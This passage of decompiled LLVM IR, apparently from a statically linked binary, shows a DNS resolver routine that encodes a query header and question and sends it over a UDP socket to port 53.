  br i1 %v1_8056778, label %dec_label_pc_8056df1, label %dec_label_pc_8056780

dec_label_pc_8056780:                             ; preds = %entry
  %v1_8056780 = icmp eq i32 %v2_805676c, 0
  br i1 %v1_8056780, label %dec_label_pc_8056df1, label %dec_label_pc_8056788

dec_label_pc_8056788:                             ; preds = %dec_label_pc_8056780
  %v5_8056788 = icmp eq i32 %arg2, 0
  br i1 %v5_8056788, label %dec_label_pc_8056df1, label %dec_label_pc_8056796

dec_label_pc_8056796:                             ; preds = %dec_label_pc_8056788
  %v4_8056796 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8056796, i32* %eax.global-to-local, align 4
  %v2_805679d = load i8, i8* %arg1, align 1
  %v3_805679d = icmp eq i8 %v2_805679d, 0
  br i1 %v3_805679d, label %dec_label_pc_8056df1, label %dec_label_pc_80567a6

dec_label_pc_80567a6:                             ; preds = %dec_label_pc_8056796
  store i8* %arg1, i8** %stack_var_-252, align 4
  %v3_80567aa = call i32 @strlen(i8* nonnull %arg1)
  store i32 %v3_80567aa, i32* @eax, align 4
  store i32 %v4_8056796, i32* %edx.global-to-local, align 4
  %v2_80567cd = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_80567cd, i32* @ebx, align 4
  %tmp46 = bitcast i32* %stack_var_-52 to i8*
  store i8* %tmp46, i8** %stack_var_-252, align 4
  %v3_80567d5 = call i32 @__pthread_return_void(i32 %v2_80567cd, i32 134567199)
  store i32 %v3_80567d5, i32* %eax.global-to-local, align 4
  store i8* bitcast (i8** @global_var_8065748.1015 to i8*), i8** %stack_var_-252, align 4
  %v2_80567e1 = call i32 @__pthread_return_0(i32 ptrtoint (i8** @global_var_8065748.1015 to i32))
  %v0_80567e6 = load i64, i64* @global_var_8065760.1016, align 8
  %v1_80567e6 = trunc i64 %v0_80567e6 to i32
  %v1_80567eb = ashr i32 %v1_80567e6, 31
  %v6_80567ec = and i64 %v0_80567e6, 4294967295
  %v8_80567ec = zext i32 %v1_80567eb to i64
  %v9_80567ec = mul nuw i64 %v8_80567ec, 4294967296
  %v10_80567ec = or i64 %v9_80567ec, %v6_80567ec
  %v14_80567ec = srem i64 %v10_80567ec, %tmp33
  %v15_80567ec = trunc i64 %v14_80567ec to i32
  %v0_80567f3 = load i16, i16* @global_var_805f4a4.1017, align 4
  %v2_8056802 = load i8*, i8** %stack_var_-252, align 4
  %v3_8056802 = ptrtoint i8* %v2_8056802 to i32
  store i32 %v3_8056802, i32* @eax, align 4
  store i32 134567199, i32* %edx.global-to-local, align 4
  store i8* %tmp46, i8** %stack_var_-252, align 4
  %v3_8056807 = call i32 @__pthread_return_void(i32 %v2_80567cd, i32 1)
  store i32 %v3_8056807, i32* %eax.global-to-local, align 4
  %v4_80569ae = inttoptr i32 %v15_80567ec to i8*
  %v1_8056dcc72 = add i32 %v12_8056775, 28
  %v2_8056dcc73 = inttoptr i32 %v1_8056dcc72 to i32*
  %v3_8056dcc74 = load i32, i32* %v2_8056dcc73, align 4
  %tmp = icmp ult i32 %v3_8056dcc74, 3
  br i1 %tmp, label %dec_label_pc_805682c, label %dec_label_pc_8056df1

dec_label_pc_805682c:                             ; preds = %dec_label_pc_80567a6, %dec_label_pc_8056dcc.backedge
  %v0_805683383 = phi i32 [ %v0_8056dcc.pre, %dec_label_pc_8056dcc.backedge ], [ %v12_8056775, %dec_label_pc_80567a6 ]
  %v1_805682c = add i32 %v0_805683383, 20
  %v2_805682c = inttoptr i32 %v1_805682c to i32*
  %v3_805682c = load i32, i32* %v2_805682c, align 4
  %v13_805682c = icmp eq i32 %v3_805682c, -1
  br i1 %v13_805682c, label %dec_label_pc_805682c.dec_label_pc_8056842_crit_edge, label %dec_label_pc_8056833

dec_label_pc_805682c.dec_label_pc_8056842_crit_edge: ; preds = %dec_label_pc_805682c
  %v0_8056842.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8056842

dec_label_pc_8056833:                             ; preds = %dec_label_pc_805682c
  %v3_8056836 = load i32, i32* %v2_805682c, align 4
  %v5_8056836 = add i32 %v0_805683383, -16
  %v6_8056836 = inttoptr i32 %v5_8056836 to i32*
  store i32 %v3_8056836, i32* %v6_8056836, align 4
  %v1_805683a = call i32 @__libc_close(i32 -1)
  store i32 %v1_805683a, i32* %eax.global-to-local, align 4
  %v0_805683f = load i32, i32* @esp, align 4
  %v1_805683f = add i32 %v0_805683f, 16
  br label %dec_label_pc_8056842

dec_label_pc_8056842:                             ; preds = %dec_label_pc_805682c.dec_label_pc_8056842_crit_edge, %dec_label_pc_8056833
  %v1_8056842 = phi i32 [ %v0_805683383, %dec_label_pc_805682c.dec_label_pc_8056842_crit_edge ], [ %v1_805683f, %dec_label_pc_8056833 ]
  %v0_8056842 = phi i32 [ %v0_8056842.pre, %dec_label_pc_805682c.dec_label_pc_8056842_crit_edge ], [ %v1_805683a, %dec_label_pc_8056833 ]
  %v2_8056842 = add i32 %v1_8056842, -4
  %v3_8056842 = inttoptr i32 %v2_8056842 to i32*
  store i32 %v0_8056842, i32* %v3_8056842, align 4
  %v1_8056843 = add i32 %v1_8056842, -8
  %v2_8056843 = inttoptr i32 %v1_8056843 to i32*
  store i32 512, i32* %v2_8056843, align 4
  %v1_8056848 = add i32 %v1_8056842, -12
  %v2_8056848 = inttoptr i32 %v1_8056848 to i32*
  store i32 0, i32* %v2_8056848, align 4
  %v2_805684a = add i32 %v1_8056842, -16
  %v3_805684a = inttoptr i32 %v2_805684a to i32*
  store i32 %v2_805675e, i32* %v3_805684a, align 4
  %v4_805684b = call i32 @__GI_memset(i8* inttoptr (i32 -1 to i8*), i32 %v15_80567ec, i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_805684b, i32* %eax.global-to-local, align 4
  %v0_8056850 = load i32, i32* @esp, align 4
  %v1_8056853 = add i32 %v0_8056850, 8
  %v2_8056853 = inttoptr i32 %v1_8056853 to i32*
  store i32 48, i32* %v2_8056853, align 4
  %v1_8056855 = add i32 %v0_8056850, 4
  %v2_8056855 = inttoptr i32 %v1_8056855 to i32*
  store i32 0, i32* %v2_8056855, align 4
  %v1_8056857 = add i32 %v0_8056850, 84
  store i32 %v1_8056857, i32* @ebx, align 4
  %v3_805685b = inttoptr i32 %v0_8056850 to i32*
  store i32 %v1_8056857, i32* %v3_805685b, align 4
  %v4_805685c = call i32 @__GI_memset(i8* inttoptr (i32 -1 to i8*), i32 %v15_80567ec, i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_805685c, i32* %eax.global-to-local, align 4
  %v0_8056861 = load i32, i32* @esp, align 4
  %v1_8056861 = add i32 %v0_8056861, 72
  %v2_8056861 = inttoptr i32 %v1_8056861 to i32*
  %v3_8056861 = load i32, i32* %v2_8056861, align 4
  store i32 %v3_8056861, i32* %eax.global-to-local, align 4
  %v1_8056865 = add i32 %v0_8056861, 116
  %v2_8056865 = inttoptr i32 %v1_8056865 to i32*
  store i32 1, i32* %v2_8056865, align 4
  %v0_805686d = load i32, i32* @esp, align 4
  %v1_805686d = add i32 %v0_805686d, 104
  %v2_805686d = inttoptr i32 %v1_805686d to i32*
  store i32 1, i32* %v2_805686d, align 4
  %v0_8056875 = load i32, i32* %eax.global-to-local, align 4
  %v1_8056875 = add i32 %v0_8056875, 1
  %v1_8056876 = urem i32 %v1_8056875, 65536
  store i32 %v1_8056876, i32* %eax.global-to-local, align 4
  %v1_805687b = load i32, i32* @esp, align 4
  %v2_805687b = add i32 %v1_805687b, 72
  %v3_805687b = inttoptr i32 %v2_805687b to i32*
  store i32 %v1_8056876, i32* %v3_805687b, align 4
  %v0_805687f = load i32, i32* %eax.global-to-local, align 4
  %v1_805687f = load i32, i32* @esp, align 4
  %v2_805687f = add i32 %v1_805687f, 84
  %v3_805687f = inttoptr i32 %v2_805687f to i32*
  store i32 %v0_805687f, i32* %v3_805687f, align 4
  %v0_8056883 = load i32, i32* @esp, align 4
  %v1_8056886 = add i32 %v0_8056883, 8
  %v2_8056886 = inttoptr i32 %v1_8056886 to i32*
  store i32 512, i32* %v2_8056886, align 4
  %v2_805688b = add i32 %v0_8056883, 4
  %v3_805688b = inttoptr i32 %v2_805688b to i32*
  store i32 %v2_805675e, i32* %v3_805688b, align 4
  %v0_805688c = load i32, i32* @ebx, align 4
  %v3_805688c = inttoptr i32 %v0_8056883 to i32*
  store i32 %v0_805688c, i32* %v3_805688c, align 4
  %v0_805688d = call i32 @__encode_header()
  store i32 %v0_805688d, i32* %eax.global-to-local, align 4
  %v0_8056892 = load i32, i32* @esp, align 4
  %v2_8056895 = icmp slt i32 %v0_805688d, 0
  store i32 %v0_805688d, i32* @ebx, align 4
  br i1 %v2_8056895, label %dec_label_pc_8056df1, label %dec_label_pc_805689f

dec_label_pc_805689f:                             ; preds = %dec_label_pc_8056842
  %v2_805689f = add i32 %v0_8056892, 12
  %v3_805689f = inttoptr i32 %v2_805689f to i32*
  store i32 %v0_805688d, i32* %v3_805689f, align 4
  %v1_80568a0 = add i32 %v0_8056892, 8
  %v2_80568a0 = inttoptr i32 %v1_80568a0 to i32*
  store i32 1025, i32* %v2_80568a0, align 4
  %v1_80568a5 = add i32 %v0_8056892, 256
  %v2_80568a5 = inttoptr i32 %v1_80568a5 to i32*
  %v3_80568a5 = load i32, i32* %v2_80568a5, align 4
  %v5_80568a5 = add i32 %v0_8056892, 4
  %v6_80568a5 = inttoptr i32 %v5_80568a5 to i32*
  store i32 %v3_80568a5, i32* %v6_80568a5, align 4
  %v1_80568ac = add i32 %v0_8056892, 28
  %v2_80568ac = inttoptr i32 %v1_80568ac to i32*
  %v3_80568ac = load i32, i32* %v2_80568ac, align 4
  %v6_80568ac = inttoptr i32 %v0_8056892 to i32*
  store i32 %v3_80568ac, i32* %v6_80568ac, align 4
  %v4_80568b0 = call i32 @strncpy(i8* inttoptr (i32 -1 to i8*), i32 %v15_80567ec, i32 ptrtoint (i32* @0 to i32))
  %v0_80568b5 = load i32, i32* @esp, align 4
  %v1_80568b8 = add i32 %v0_80568b5, 8
  %v2_80568b8 = inttoptr i32 %v1_80568b8 to i32*
  store i32 ptrtoint (i32* @global_var_805f4a8.953 to i32), i32* %v2_80568b8, align 4
  %v1_80568bd = add i32 %v0_80568b5, 4
  %v2_80568bd = inttoptr i32 %v1_80568bd to i32*
  store i32 134567199, i32* %v2_80568bd, align 4
  %v1_80568c2 = add i32 %v0_80568b5, 200
  store i32 %v1_80568c2, i32* @eax, align 4
  %v3_80568c9 = inttoptr i32 %v0_80568b5 to i32*
  store i32 %v1_80568c2, i32* %v3_80568c9, align 4
  %v2_80568ca = call i32 @__pthread_return_void(i32 -1, i32 %v15_80567ec)
  store i32 %v2_80568ca, i32* %eax.global-to-local, align 4
  %v0_80568cf = load i32, i32* @esp, align 4
  %v1_80568cf = inttoptr i32 %v0_80568cf to i32*
  store i32 ptrtoint (i32* @global_var_805f4a8.953 to i32), i32* %v1_80568cf, align 4
  %v1_80568d6 = call i32 @__pthread_return_0(i32 -1)
  store i32 %v1_80568d6, i32* %eax.global-to-local, align 4
  %v0_80568db = load i32, i32* @esp, align 4
  %v1_80568db = add i32 %v0_80568db, 56
  %v2_80568db = inttoptr i32 %v1_80568db to i32*
  %v3_80568db = load i32, i32* %v2_80568db, align 4
  store i32 %v3_80568db, i32* %edx.global-to-local, align 4
  %v1_80568df = add i32 %v0_80568db, 268
  %v2_80568df = inttoptr i32 %v1_80568df to i32*
  %v3_80568df = load i32, i32* %v2_80568df, align 4
  store i32 %v3_80568df, i32* %eax.global-to-local, align 4
  %v2_80568e6 = mul i32 %v3_80568db, 4
  %v3_80568e6 = add i32 %v3_80568df, %v2_80568e6
  %v4_80568e6 = inttoptr i32 %v3_80568e6 to i32*
  %v5_80568e6 = load i32, i32* %v4_80568e6, align 4
  store i32 %v5_80568e6, i32* %edx.global-to-local, align 4
  %v2_80568e9 = add i32 %v0_80568db, 48
  %v3_80568e9 = inttoptr i32 %v2_80568e9 to i32*
  store i32 %v5_80568e6, i32* %v3_80568e9, align 4
  %v0_80568ed = load i32, i32* @esp, align 4
  %v1_80568ed = add i32 %v0_80568ed, 16
  %v1_80568f0 = add i32 %v0_80568ed, 52
  %v2_80568f0 = inttoptr i32 %v1_80568f0 to i32*
  %v3_80568f0 = load i32, i32* %v2_80568f0, align 4
  %v5_80568f0 = icmp slt i32 %v3_80568f0, 0
  br i1 %v5_80568f0, label %dec_label_pc_805689f.dec_label_pc_8056936_crit_edge, label %dec_label_pc_80568f7

dec_label_pc_805689f.dec_label_pc_8056936_crit_edge: ; preds = %dec_label_pc_805689f
  %v0_8056936.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8056936

dec_label_pc_80568f7:                             ; preds = %dec_label_pc_805689f
  store i32 %v3_80568f0, i32* %eax.global-to-local, align 4
  %v1_80568fb = load i32, i32* @global_var_8065b98.1018, align 8
  %v2_80568fb = sub i32 %v3_80568f0, %v1_80568fb
  %v8_80568fb = xor i32 %v1_80568fb, %v3_80568f0
  %v9_80568fb = xor i32 %v2_80568fb, %v3_80568f0
  %v10_80568fb = and i32 %v9_80568fb, %v8_80568fb
  %v11_80568fb = icmp slt i32 %v10_80568fb, 0
  %v13_80568fb = icmp slt i32 %v2_80568fb, 0
  %v2_8056901 = icmp eq i1 %v13_80568fb, %v11_80568fb
  br i1 %v2_8056901, label %dec_label_pc_8056936, label %dec_label_pc_8056903

dec_label_pc_8056903:                             ; preds = %dec_label_pc_80568f7
  %v2_8056903 = add i32 %v0_80568ed, 12
  %v3_8056903 = inttoptr i32 %v2_8056903 to i32*
  store i32 %v3_80568f0, i32* %v3_8056903, align 4
  %v1_8056904 = add i32 %v0_80568ed, 8
  %v2_8056904 = inttoptr i32 %v1_8056904 to i32*
  store i32 1025, i32* %v2_8056904, align 4
  %v1_8056909 = add i32 %v0_80568ed, 4
  %v2_8056909 = inttoptr i32 %v1_8056909 to i32*
  store i32 ptrtoint (i32* @global_var_805ee5c.1019 to i32), i32* %v2_8056909, align 4
  %v1_805690e = add i32 %v0_80568ed, 28
  %v2_805690e = inttoptr i32 %v1_805690e to i32*
  %v3_805690e = load i32, i32* %v2_805690e, align 4
  %v6_805690e = inttoptr i32 %v0_80568ed to i32*
  store i32 %v3_805690e, i32* %v6_805690e, align 4
  %v0_8056912 = call i32 @__GI_strncat()
  store i32 %v0_8056912, i32* %eax.global-to-local, align 4
  %v0_8056917 = load i32, i32* @esp, align 4
  %v1_805691a = add i32 %v0_8056917, 8
  %v2_805691a = inttoptr i32 %v1_805691a to i32*
  store i32 1025, i32* %v2_805691a, align 4
  %v1_805691f = add i32 %v0_8056917, 52
  %v2_805691f = inttoptr i32 %v1_805691f to i32*
  %v3_805691f = load i32, i32* %v2_805691f, align 4
  store i32 %v3_805691f, i32* %edx.global-to-local, align 4
  %v1_8056923 = mul i32 %v3_805691f, 4
  %v2_8056923 = add i32 %v1_8056923, 134634360
  %v3_8056923 = inttoptr i32 %v2_8056923 to i32*
  %v4_8056923 = load i32, i32* %v3_8056923, align 4
  %v6_8056923 = add i32 %v0_8056917, 4
  %v7_8056923 = inttoptr i32 %v6_8056923 to i32*
  store i32 %v4_8056923, i32* %v7_8056923, align 4
  %v1_805692a = add i32 %v0_8056917, 28
  %v2_805692a = inttoptr i32 %v1_805692a to i32*
  %v3_805692a = load i32, i32* %v2_805692a, align 4
  %v6_805692a = inttoptr i32 %v0_8056917 to i32*
  store i32 %v3_805692a, i32* %v6_805692a, align 4
  %v0_805692e = call i32 @__GI_strncat()
  store i32 %v0_805692e, i32* %eax.global-to-local, align 4
  %v0_8056933 = load i32, i32* @esp, align 4
  %v1_8056933 = add i32 %v0_8056933, 16
  br label %dec_label_pc_8056936

dec_label_pc_8056936:                             ; preds = %dec_label_pc_805689f.dec_label_pc_8056936_crit_edge, %dec_label_pc_80568f7, %dec_label_pc_8056903
  %v1_8056936 = phi i32 [ %v1_80568ed, %dec_label_pc_805689f.dec_label_pc_8056936_crit_edge ], [ %v1_80568ed, %dec_label_pc_80568f7 ], [ %v1_8056933, %dec_label_pc_8056903 ]
  %v0_8056936 = phi i32 [ %v0_8056936.pre, %dec_label_pc_805689f.dec_label_pc_8056936_crit_edge ], [ %v3_80568f0, %dec_label_pc_80568f7 ], [ %v0_805692e, %dec_label_pc_8056903 ]
  %v2_8056936 = add i32 %v1_8056936, -4
  %v3_8056936 = inttoptr i32 %v2_8056936 to i32*
  store i32 %v0_8056936, i32* %v3_8056936, align 4
  %v0_8056937 = load i32, i32* %eax.global-to-local, align 4
  %v2_8056937 = add i32 %v1_8056936, -8
  %v3_8056937 = inttoptr i32 %v2_8056937 to i32*
  store i32 %v0_8056937, i32* %v3_8056937, align 4
  %v1_8056938 = add i32 %v1_8056936, -12
  %v2_8056938 = inttoptr i32 %v1_8056938 to i32*
  store i32 1, i32* %v2_8056938, align 4
  %v1_805693a = add i32 %v1_8056936, 184
  store i32 %v1_805693a, i32* @eax, align 4
  %v2_8056941 = add i32 %v1_8056936, -16
  %v3_8056941 = inttoptr i32 %v2_8056941 to i32*
  store i32 %v1_805693a, i32* %v3_8056941, align 4
  %v2_8056942 = call i32 @__pthread_return_void(i32 -1, i32 %v15_80567ec)
  store i32 %v2_8056942, i32* %eax.global-to-local, align 4
  %v0_8056947 = load i32, i32* @esp, align 4
  %v1_8056947 = add i32 %v0_8056947, 28
  %v2_8056947 = inttoptr i32 %v1_8056947 to i32*
  %v3_8056947 = load i32, i32* %v2_8056947, align 4
  store i32 %v3_8056947, i32* %eax.global-to-local, align 4
  %v1_805694b = add i32 %v0_8056947, 260
  %v2_805694b = inttoptr i32 %v1_805694b to i32*
  %v3_805694b = load i32, i32* %v2_805694b, align 4
  store i32 %v3_805694b, i32* @edx, align 4
  %v1_8056952 = add i32 %v0_8056947, 224
  %v2_8056952 = inttoptr i32 %v1_8056952 to i32*
  store i32 1, i32* %v2_8056952, align 4
  %v0_805695d = load i32, i32* %eax.global-to-local, align 4
  %v1_805695d = load i32, i32* @esp, align 4
  %v2_805695d = add i32 %v1_805695d, 216
  %v3_805695d = inttoptr i32 %v2_805695d to i32*
  store i32 %v0_805695d, i32* %v3_805695d, align 4
  %v1_8056969 = load i32, i32* @ebx, align 4
  %v2_8056969 = sub i32 512, %v1_8056969
  store i32 %v2_8056969, i32* %eax.global-to-local, align 4
  %v0_805696b = load i32, i32* @edx, align 4
  %v1_805696b = load i32, i32* @esp, align 4
  %v2_805696b = add i32 %v1_805696b, 220
  %v3_805696b = inttoptr i32 %v2_805696b to i32*
  store i32 %v0_805696b, i32* %v3_805696b, align 4
  %v0_8056972 = load i32, i32* @esp, align 4
  %v0_8056975 = load i32, i32* %eax.global-to-local, align 4
  %v2_8056975 = add i32 %v0_8056972, 8
  %v3_8056975 = inttoptr i32 %v2_8056975 to i32*
  store i32 %v0_8056975, i32* %v3_8056975, align 4
  %v1_8056976 = load i32, i32* @ebx, align 4
  %v2_8056976 = add i32 %v1_8056976, %v2_805675e
  %v2_805697a = add i32 %v0_8056972, 4
  %v3_805697a = inttoptr i32 %v2_805697a to i32*
  store i32 %v2_8056976, i32* %v3_805697a, align 4
  %v1_805697b = add i32 %v0_8056972, 216
  store i32 %v1_805697b, i32* @eax, align 4
  %v3_8056982 = inttoptr i32 %v0_8056972 to i32*
  store i32 %v1_805697b, i32* %v3_8056982, align 4
  %v0_8056983 = call i32 @__encode_question()
  store i32 %v0_8056983, i32* %eax.global-to-local, align 4
  %v0_8056988 = load i32, i32* @esp, align 4
  %v2_805698b = icmp slt i32 %v0_8056983, 0
  store i32 %v0_8056983, i32* @esi, align 4
  br i1 %v2_805698b, label %dec_label_pc_8056df1, label %dec_label_pc_8056995

dec_label_pc_8056995:                             ; preds = %dec_label_pc_8056936
  %v1_8056995 = add i32 %v0_8056988, 172
  %v2_8056995 = inttoptr i32 %v1_8056995 to i16*
  store i16 2, i16* %v2_8056995, align 2
  %v1_805699f = load i32, i32* @esp, align 4
  %v2_805699f = add i32 %v1_805699f, -4
  %v3_805699f = inttoptr i32 %v2_805699f to i32*
  store i32 %v0_8056983, i32* %v3_805699f, align 4
  %v1_80569a0 = add i32 %v1_805699f, 164
  store i32 %v1_80569a0, i32* %eax.global-to-local, align 4
  %v2_80569a7 = add i32 %v1_805699f, -8
  %v3_80569a7 = inttoptr i32 %v2_80569a7 to i32*
  store i32 %v1_80569a0, i32* %v3_80569a7, align 4
  %v1_80569a8 = add i32 %v1_805699f, 32
  %v2_80569a8 = inttoptr i32 %v1_80569a8 to i32*
  %v3_80569a8 = load i32, i32* %v2_80569a8, align 4
  %v5_80569a8 = add i32 %v1_805699f, -12
  %v6_80569a8 = inttoptr i32 %v5_80569a8 to i32*
  store i32 %v3_80569a8, i32* %v6_80569a8, align 4
  %v1_80569ac = add i32 %v1_805699f, -16
  %v2_80569ac = inttoptr i32 %v1_80569ac to i32*
  store i32 10, i32* %v2_80569ac, align 4
  %v5_80569ae = call i32 @inet_pton(i32 -1, i8* %v4_80569ae, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_80569ae, i32* %eax.global-to-local, align 4
  %v0_80569b3 = load i32, i32* @esp, align 4
  %v1_80569b3 = add i32 %v0_80569b3, 16
  %tmp47 = icmp slt i32 %v5_80569ae, 1
  br i1 %tmp47, label %dec_label_pc_80569c4, label %dec_label_pc_80569ba

dec_label_pc_80569ba:                             ; preds = %dec_label_pc_8056995
  %v1_80569ba = add i32 %v0_80569b3, 172
  %v2_80569ba = inttoptr i32 %v1_80569ba to i16*
  store i16 10, i16* %v2_80569ba, align 2
  %v0_80569c4.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_80569c4

dec_label_pc_80569c4:                             ; preds = %dec_label_pc_8056995, %dec_label_pc_80569ba
  %v0_80569db = phi i32 [ %v1_80569b3, %dec_label_pc_8056995 ], [ %v0_80569c4.pre, %dec_label_pc_80569ba ]
  %v1_80569c4 = add i32 %v0_80569db, 156
  %v2_80569c4 = inttoptr i32 %v1_80569c4 to i16*
  %v3_80569c4 = load i16, i16* %v2_80569c4, align 2
  %v12_80569c4 = icmp eq i16 %v3_80569c4, 10
  %v1_80569cd = icmp eq i1 %v12_80569c4, false
  %v1_80569db = add i32 %v0_80569db, 158
  %v2_80569db = inttoptr i32 %v1_80569db to i16*
  store i16 13568, i16* %v2_80569db, align 2
  %v0_80569e5 = load i32, i32* @esp, align 4
  br i1 %v1_80569cd, label %dec_label_pc_80569db, label %dec_label_pc_80569fb

dec_label_pc_80569db:                             ; preds = %dec_label_pc_80569c4
  %v1_80569e8 = add i32 %v0_80569e5, 32
  %v2_80569e8 = inttoptr i32 %v1_80569e8 to i32*
  %v3_80569e8 = load i32, i32* %v2_80569e8, align 4
  %v5_80569e8 = add i32 %v0_80569e5, -16
  %v6_80569e8 = inttoptr i32 %v5_80569e8 to i32*
  store i32 %v3_80569e8, i32* %v6_80569e8, align 4
  %v1_80569ec = call i32 @inet_addr(i32 -1)
  store i32 %v1_80569ec, i32* %eax.global-to-local, align 4
  %v1_80569f1 = load i32, i32* @esp, align 4
  %v2_80569f1 = add i32 %v1_80569f1, 176
  %v3_80569f1 = inttoptr i32 %v2_80569f1 to i32*
  store i32 %v1_80569ec, i32* %v3_80569f1, align 4
  %v0_80569f8 = load i32, i32* @esp, align 4
  %v1_80569f8 = add i32 %v0_80569f8, 16
  br label %dec_label_pc_80569fb

dec_label_pc_80569fb:                             ; preds = %dec_label_pc_80569c4, %dec_label_pc_80569db
  %v1_80569fb = phi i32 [ %v1_80569f8, %dec_label_pc_80569db ], [ %v0_80569e5, %dec_label_pc_80569c4 ]
  %v0_80569fb = load i32, i32* @ecx, align 4
  %v2_80569fb = add i32 %v1_80569fb, -4
  %v3_80569fb = inttoptr i32 %v2_80569fb to i32*
  store i32 %v0_80569fb, i32* %v3_80569fb, align 4
  %v1_80569fc = add i32 %v1_80569fb, -8
  %v2_80569fc = inttoptr i32 %v1_80569fc to i32*
  store i32 17, i32* %v2_80569fc, align 4
  %v1_80569fe = add i32 %v1_80569fb, -12
  %v2_80569fe = inttoptr i32 %v1_80569fe to i32*
  store i32 2, i32* %v2_80569fe, align 4
  %v1_8056a00 = add i32 %v1_80569fb, 156
  %v2_8056a00 = inttoptr i32 %v1_8056a00 to i16*
  %v3_8056a00 = load i16, i16* %v2_8056a00, align 2
  %v4_8056a00 = zext i16 %v3_8056a00 to i32
  store i32 %v4_8056a00, i32* %eax.global-to-local, align 4
  %v2_8056a08 = add i32 %v1_80569fb, -16
  %v3_8056a08 = inttoptr i32 %v2_8056a08 to i32*
  store i32 %v4_8056a00, i32* %v3_8056a08, align 4
  %v3_8056a09 = call i32 @socket(i32 -1, i32 %v15_80567ec, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8056a09, i32* %eax.global-to-local, align 4
  %v1_8056a0e = load i32, i32* @esp, align 4
  %v2_8056a0e = add i32 %v1_8056a0e, 36
  %v3_8056a0e = inttoptr i32 %v2_8056a0e to i32*
  store i32 %v3_8056a09, i32* %v3_8056a0e, align 4
  %v0_8056a12 = load i32, i32* @esp, align 4
  %v1_8056a12 = add i32 %v0_8056a12, 16
  %v0_8056a15 = load i32, i32* %eax.global-to-local, align 4
  %v2_8056a15 = icmp slt i32 %v0_8056a15, 0
  br i1 %v2_8056a15, label %dec_label_pc_8056a42, label %dec_label_pc_8056a19

dec_label_pc_8056a19:                             ; preds = %dec_label_pc_80569fb
  %v1_8056a19 = add i32 %v0_8056a12, 172
  store i32 %v1_8056a19, i32* %eax.global-to-local, align 4
  %v0_8056a20 = load i32, i32* @edx, align 4
  %v2_8056a20 = add i32 %v0_8056a12, 12
  %v3_8056a20 = inttoptr i32 %v2_8056a20 to i32*
  store i32 %v0_8056a20, i32* %v3_8056a20, align 4
  %v1_8056a21 = add i32 %v0_8056a12, 8
  %v2_8056a21 = inttoptr i32 %v1_8056a21 to i32*
  store i32 28, i32* %v2_8056a21, align 4
  %v0_8056a23 = load i32, i32* %eax.global-to-local, align 4
  %v2_8056a23 = add i32 %v0_8056a12, 4
  %v3_8056a23 = inttoptr i32 %v2_8056a23 to i32*
  store i32 %v0_8056a23, i32* %v3_8056a23, align 4
  %v1_8056a24 = add i32 %v0_8056a12, 36
  %v2_8056a24 = inttoptr i32 %v1_8056a24 to i32*
  %v3_8056a24 = load i32, i32* %v2_8056a24, align 4
  %v6_8056a24 = inttoptr i32 %v0_8056a12 to i32*
  store i32 %v3_8056a24, i32* %v6_8056a24, align 4
  %v3_8056a28 = call i32 @__libc_connect(i32 -1, i32 %v15_80567ec, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8056a28, i32* %eax.global-to-local, align 4
  %v0_8056a2d = load i32, i32* @esp, align 4
  %v2_8056a30 = icmp slt i32 %v3_8056a28, 0
  %v1_8056a32 = icmp eq i1 %v2_8056a30, false
  br i1 %v1_8056a32, label %dec_label_pc_8056a4b, label %dec_label_pc_8056a34

dec_label_pc_8056a34:                             ; preds = %dec_label_pc_8056a19
  %v1_8056a34 = call i32 @__errno_location(i32 -1)
  store i32 %v1_8056a34, i32* %eax.global-to-local, align 4
  %v1_8056a39 = inttoptr i32 %v1_8056a34 to i32*
  %v2_8056a39 = load i32, i32* %v1_8056a39, align 4
  %v11_8056a39 = icmp eq i32 %v2_8056a39, 101
  %v0_8056dab.pre = load i32, i32* @esp, align 4
  br i1 %v11_8056a39, label %dec_label_pc_8056dab, label %dec_label_pc_8056a42

dec_label_pc_8056a42:                             ; preds = %dec_label_pc_8056a34, %dec_label_pc_80569fb
  %v17_8056a42 = phi i32 [ %v1_8056a12, %dec_label_pc_80569fb ], [ %v0_8056dab.pre, %dec_label_pc_8056a34 ]
  %v1_8056a42 = add i32 %v17_8056a42, 28
  %v2_8056a42 = inttoptr i32 %v1_8056a42 to i32*
  %v3_8056a42 = load i32, i32* %v2_8056a42, align 4
  %v4_8056a42 = add i32 %v3_8056a42, 1
  store i32 %v4_8056a42, i32* %v2_8056a42, align 4
  br label %dec_label_pc_8056dcc.backedge

dec_label_pc_8056a4b:                             ; preds = %dec_label_pc_8056a19
  %v1_8056a4b = add i32 %v0_8056a2d, 12
  %v2_8056a4b = inttoptr i32 %v1_8056a4b to i32*
  store i32 0, i32* %v2_8056a4b, align 4
  %v0_8056a4d = load i32, i32* @ebx, align 4
  %v1_8056a4d = load i32, i32* @esi, align 4
  %v2_8056a4d = add i32 %v1_8056a4d, %v0_8056a4d
  store i32 %v2_8056a4d, i32* %eax.global-to-local, align 4
  %v2_8056a50 = add i32 %v0_8056a2d, 8
  %v3_8056a50 = inttoptr i32 %v2_8056a50 to i32*
  store i32 %v2_8056a4d, i32* %v3_8056a50, align 4
  %v2_8056a51 = add i32 %v0_8056a2d, 4
  %v3_8056a51 = inttoptr i32 %v2_8056a51 to i32*
  store i32 %v2_805675e, i32* %v3_8056a51, align 4
  %v1_8056a52 = add i32 %v0_8056a2d, 36
  %v2_8056a52 = inttoptr i32 %v1_8056a52 to i32*
  %v3_8056a52 = load i32, i32* %v2_8056a52, align 4
  %v6_8056a52 = inttoptr i32 %v0_8056a2d to i32*
  store i32 %v3_8056a52, i32* %v6_8056a52, align 4
  %v4_8056a56 = call i32 @__libc_send(i32 -1, i32 %v15_80567ec, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8056a56, i32* %eax.global-to-local, align 4
  %v0_8056a5b = load i32, i32* @esp, align 4
  %v1_8056a5b = add i32 %v0_8056a5b, 36
  %v2_8056a5b = inttoptr i32 %v1_8056a5b to i32*
  %v3_8056a5b = load i32, i32* %v2_8056a5b, align 4
  store i32 %v3_8056a5b, i32* %eax.global-to-local, align 4
